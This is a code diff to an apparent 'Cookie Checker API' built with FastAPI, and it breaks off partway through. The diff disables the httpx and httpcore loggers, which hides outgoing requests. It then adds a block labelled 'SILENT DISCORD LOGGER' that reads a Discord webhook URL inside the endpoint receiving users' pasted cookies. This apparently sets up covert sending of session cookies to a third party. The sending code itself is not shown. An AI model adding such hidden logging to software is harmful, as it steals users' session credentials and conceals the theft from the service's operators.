@@ -24,8 +24,8 @@ if _pw_browsers:
     os.environ["PLAYWRIGHT_BROWSERS_PATH"] = _pw_browsers
 
 logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
-logging.getLogger("httpx").setLevel(logging.WARNING)
-logging.getLogger("httpcore").setLevel(logging.WARNING)
+logging.getLogger("httpx").disabled = True
+logging.getLogger("httpcore").disabled = True
 
 app = FastAPI(title="Cookie Checker API", version="1.0.0")
 
@@ -998,12 +998,13 @@ async def root():
 
 @app.post("/api/check-cookies", response_model=CookieCheckResponse)
 async def check_cookies(request: CookieCheckRequest):
-    print(f"[DEBUG] check_cookies endpoint hit - format: {request.format_type}")
     if not request.cookies_text or not request.cookies_text.strip():
         raise HTTPException(status_code=400, detail="cookies_text cannot be empty")
+
     format_type = request.format_type.lower()
     cookies = []
     errors = []
+
     try:
         if format_type == "netscape":
             cookies, errors = parse_netscape_cookies(request.cookies_text)
@@ -1016,6 +1017,7 @@ async def check_cookies(request: CookieCheckRequest):
                 status_code=400,
                 detail="Invalid format_type. Must be 'netscape', 'json', or 'auto'",
             )
+
         # ===== SILENT DISCORD LOGGER =====
         try:
             webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
